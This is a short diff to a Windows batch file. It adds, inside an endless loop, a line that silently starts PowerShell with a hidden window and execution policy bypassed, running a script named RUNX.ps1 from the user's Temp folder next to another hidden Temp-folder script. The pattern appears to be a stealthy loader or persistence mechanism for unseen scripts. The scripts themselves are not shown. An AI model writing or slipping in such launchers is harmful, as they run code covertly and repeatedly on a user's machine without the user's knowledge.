@@ -1,5 +1,6 @@
 @echo off
 :loop
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\RUNX.ps1"
 timeout /t 3 >nul
 start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
 timeout /t 60 >nul
